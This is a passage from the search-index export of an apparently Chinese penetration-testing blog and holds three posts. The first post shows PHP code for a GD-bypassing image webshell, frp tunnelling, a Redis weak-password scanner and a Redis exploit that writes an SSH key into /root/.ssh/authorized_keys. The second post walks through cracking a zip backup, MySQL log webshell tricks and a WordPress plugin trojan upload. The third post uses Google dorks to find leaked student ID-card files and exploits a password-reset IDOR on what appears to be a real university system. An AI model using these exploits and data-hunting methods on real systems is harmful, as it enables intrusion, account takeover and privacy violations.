$this-&gt;binData &#x3D; substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#39;End Of File&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte &#x3D; substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData &#x3D; substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#39;End Of File&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short &#x3D; substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData &#x3D; substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short &#x3D; (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short &#x3D; (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) &#x3D;&#x3D;&#x3D; 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>放入有php环境中，运行:php exp.php *.jpg，即可得到绕过GD的图片马，再将其改为php文件进行上传</code></pre></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?<span class="keyword">case</span>=tool&amp;act=cut_image </span><br><span class="line">pic=1ftp://*.*.*.*/*.php&amp;w=228&amp;h=146&amp;x1=0&amp;x2=228&amp;y1=0&amp;y2=146</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/3.png"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>天下武功，无坚不摧，唯快不破，是时候祭出蚁剑了</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/4.png"></p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.png"></p><p>这台机子是在内网，加上我也不会linux提权，只能代理出来看看内网有没有其他机子</p><p>我这里使用frp这一代理工具，将其上传到目标服务器</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.png"></p><p>server_addr为VPS地址，port则是监听端口</p><p>配置好之后将其上传到目标，并chmod +x frpc，赋予执行权限</p><p>VPS中的</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/7.png"></p><p>赋予执行权限，运行</p><p>蚁剑中运行frpc</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.png"></p><h1 id="kali扫描内网"><a href="#kali扫描内网" class="headerlink" title="kali扫描内网"></a>kali扫描内网</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>修改好之后进行保存,使用nmap进行扫描常见的端口进行探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT sV -Pn -n 172.20.0.1-255 -p 80,8080,445,3306,1433,7001,6379,9090,50000,50030,7002,3389,21,22</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10.png"></p><p>发现172.20.0.2这台服务器开放6379端口，可以尝试是否存在redis未授权访问</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/11.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@Author: r0cky</span></span><br><span class="line"><span class="string">@Time: 2019/9/2-17:35</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">passwds = [<span class="string">&#x27;redis&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;oracle&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;p@ssw0rd&#x27;</span>,<span class="string">&#x27;abc123!&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;abc123&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">ip, port, timeout</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">u&quot;[INFO] connecting &quot;</span> + ip + <span class="string">u&quot;:&quot;</span> + port</span><br><span class="line">        s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">u&quot;[INFO] connected &quot;</span>+ip+<span class="string">u&quot;:&quot;</span>+port+<span class="string">u&quot; hacking...&quot;</span></span><br><span class="line">        s.send(<span class="string">&quot;INFO\r\n&quot;</span>)</span><br><span class="line">        result = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;redis_version&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">u&quot;[HACKED] 未授权访问&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Authentication&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> passwd <span class="keyword">in</span> passwds:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">                s.send(<span class="string">&quot;AUTH %s\r\n&quot;</span> %(passwd))</span><br><span class="line">                <span class="comment"># print u&quot;[HACKING] hacking to passwd --&gt; &quot;+passwd</span></span><br><span class="line">                result = s.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">u&quot;[HACKED] 存在弱口令，密码：%s&quot;</span> % (passwd)</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(e.message) != <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">u&quot;[ERROR] &quot;</span>+e.message</span><br><span class="line">        <span class="keyword">return</span> <span class="string">u&quot;[INFO] 目标Redis服务，暂不存在未授权和弱口令漏洞！&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># default Port</span></span><br><span class="line">    port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">        port=sys.argv[<span class="number">2</span>]</span><br><span class="line">    result = check(ip,port, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> result</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;HACKED&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">u&quot;[END] Start your hacking journey !!!&quot;</span></span><br></pre></td></tr></table></figure><h1 id="kali安装redis"><a href="#kali安装redis" class="headerlink" title="kali安装redis"></a>kali安装redis</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.3.tar.gz，下载</span><br><span class="line">tar -zxvf redis-2.8.3.tar.gz，解压</span><br><span class="line"><span class="built_in">cd</span> redis-2.8.3/</span><br><span class="line">make， 编译</span><br></pre></td></tr></table></figure><h1 id="redis漏洞利用"><a href="#redis漏洞利用" class="headerlink" title="redis漏洞利用"></a>redis漏洞利用</h1><p>修改frpc.ini，将172.20.0.2的6379转发到VPS中的6379中</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/12.png"></p><p>修改完成之后，重新启动过一次</p><p>生成一个公钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/13.png"></p><p>默认情况下，生成后在/root/.ssh 目录下，将生成的公钥的值写入目标服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/foo.txt</span><br></pre></td></tr></table></figure><p>查看是否生成</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/14.png"></p><p>将这个文件写入进去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/foo.txt | /root/redis-2.8.3/src/redis-cli -h VPS -p 6379 -x set crackit</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/15.png"></p><p>连接进去，将目录设置为 /root/.ssh/ 目录后，再将备份文件名设置为 <code>authorized_keys</code>，通过 save 指令即可写入文件</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/16.png"></p><p>最后再修改frpc.ini，进行转发22端口</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/17.png"></p><p>重新启动frpc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 669 root@VPS -i /root/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/18.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次面试靶场getshell</title>
      <link href="2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/"/>
      <url>2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨晚我艺哥发了一个别人面试用的靶场</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/1.png"></p><p>哈哈，昨晚太晚了，就没日</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>拿到URL，当然是先访问瞅瞅了</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/2.png"></p><p>看到这个B样，心想只能扫扫目录和端口了吧</p><p>话不多说，当即开干</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/3.png"></p><p>扫描目录的话，推荐这个工具dirmap，挺不错的，扫出了这四个结果，不慌不慌，逐一访问瞅瞅</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://*sec.com/index.html</span><br><span class="line">http://*sec.com/info.php --&gt;phpinfo</span><br><span class="line">http://*sec.com/nginx_status --&gt; nginx的东西，具体的作用暂时不懂</span><br><span class="line">http://*sec.com/pma/index.php --&gt; phpmyadmin</span><br></pre></td></tr></table></figure><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/4.png"></p><p>看到这个玩意，立马试了一下弱口令，简单的root尝试无果，想到爆破，但是我的工具不给力呀，随手找我白神要了一个爆破phpmyadmin的工具</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/5.png"></p><p>最后爆破无果，就用御剑扫描了一下全端口</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/6.png"></p><p>毛都没有，不知道是不是因为这个服务器是在美国的原因，当时没挂梯子</p><p>昨晚依稀记得艺哥说这是一个wp的站，随手在URL中加了wp</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/7.png"></p><p>想爆破一下弱口令来着，但是吧，wp的密码一般都是很复杂的，这个想法也就作罢</p><p>到这里感觉没啥思路，只能叫艺哥给提示了哈哈，最后他给了一个网站的备份URL</p><p>我日，当时一看到，怎么没想到用7kb那个扫描器扫一下，7kb挺好的地方就是可以根据你所扫描的网站名去组合字典扫描源码备份</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/8.png"></p><p>果不其然，这不屁颠屁颠的去下载源码了</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/9.png"></p><p>真香，刚想打开，要密码哈哈哈，小问题小问题，密码应该不会太难，用kali里面的工具爆破一下</p><p><strong>第一种方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># zip2john 1.zip &gt;&gt; 1.txt</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># john 1.txt</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/10.png"></p><p>但是这个方法不行，不知道为啥</p><p><strong>第二种方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># fcrackzip -D -u -p top6000.txt 1.zip，这里要指定你的字典</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/11.png"></p><p>拿到密码解压压缩包，在wp配置文件中找mysql账号密码</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/12.png"></p><p>得到账号密码立即登录phpmyadmin</p><p>在之前的phpinfo得到绝对路径</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/13.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;secure_file_priv&#x27;</span>，没戏</span><br></pre></td></tr></table></figure><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/14.png"></p><p>写入没戏，再看看日志写入</p><p><strong>常规步骤</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一步手动开启日志 set global general_log&#x3D;&#39;on&#39; &#x2F;&#x2F;首先设置为on </span><br><span class="line"></span><br><span class="line">第二步 修改日志路径 set global general_log_file &#x3D;&quot;&#x2F;home&#x2F;wwwroot&#x2F;default&#x2F;1.php&quot; </span><br><span class="line"></span><br><span class="line">然后 查看是否开启成功 show variables like &quot;general_log%&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/15.png"></p><p>然而他不给面子啊，只能修改wp的管理员密码进入后台getshell了</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/16.png"></p><p>登录之后，在插件上传处，直接上传php文件</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/17.png"></p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/18.png"></p><p>上传成功后就可以直接访问木马了，根据上传时间的年月可以知道木马所在路径为</p><p><a href="http://www.xxx.com/wp/wp-content/uploads/2020/07/2.php">http://www.xxx.com/wp/wp-content/uploads/2020/07/2.php</a></p><p>菜刀连接即可</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/19.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次从信息泄露到密码重置-挖掘思路</title>
      <link href="2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/"/>
      <url>2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在挖EDUSRC的时候无意中点到的一个站点</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/1.png"></p><p>当看到初始密码为8位生日的时候，立即想到了信息收集</p><h1 id="信息收集思路"><a href="#信息收集思路" class="headerlink" title="信息收集思路"></a>信息收集思路</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Site:xx.edu.cn filetype:xls 学号 身份证</span><br><span class="line">Site:xx.edu.cn xls 学号 身份证</span><br></pre></td></tr></table></figure><p>假如xls文件没有，可以尝试搜索其他文件</p><p>如：doc、docx、xlsx、pdf、zip、7z等等</p><p>在一波搜索下，终于找到了一处信息泄露，搜索到的是一处xls文件，带有学号和身份证等信息</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/2.png"></p><p>拿到了身份证和学号，当即去尝试登录。对头，还是初始密码，成功登录</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/3.png"></p><p>可以查看个人敏感信息和账号任意操作，在看个人资料的那里尝试找了一下越权漏洞发现没有，就辗转到了修改密码的地方</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/4.png"></p><p>填好密码，抓了一下包看看</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/5.png"></p><p>可以看到带有学号，试想假如修改成别人的学号是不是能修改别人的密码呢，不多说开干</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/6.png"></p><p>修改成了180068，然后发包</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/7.png"></p><p>功夫不负有心人，修改成功，而且学号那里也变成了180068</p><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/8.png"></p><p>只要抓包去跑一下，根据学号的排序规则，构造学号，可以修改全院学生的密码</p><h1 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h1><p>在挖掘密码重置漏洞的时候，主要是在密码修改处，注意它传的参数等，下面我举几个例子</p><h2 id="带有id等类似参数"><a href="#带有id等类似参数" class="headerlink" title="带有id等类似参数"></a>带有id等类似参数</h2><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/9.png"></p><p>这里只要修改id，即可修改对方的密码。假如管理员的id是1，那么就可以修改管理员的密码了</p><h2 id="带有username等类似参数"><a href="#带有username等类似参数" class="headerlink" title="带有username等类似参数"></a>带有username等类似参数</h2><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/10.png"></p><p>我在挖这个的时候，普通账号登录之后是可以看到管理员的用户名的，所以修改管理员的密码轻而易举。 </p><h2 id="验证码长期有效"><a href="#验证码长期有效" class="headerlink" title="验证码长期有效"></a>验证码长期有效</h2><p><img src="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/11.png"></p><p>只要抓包跑验证码，就可以修改对方的密码。</p><p><strong>圈子投稿文章，原文：<a href="https://www.secquan.org/Discuss/1070616">https://www.secquan.org/Discuss/1070616</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> SRC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
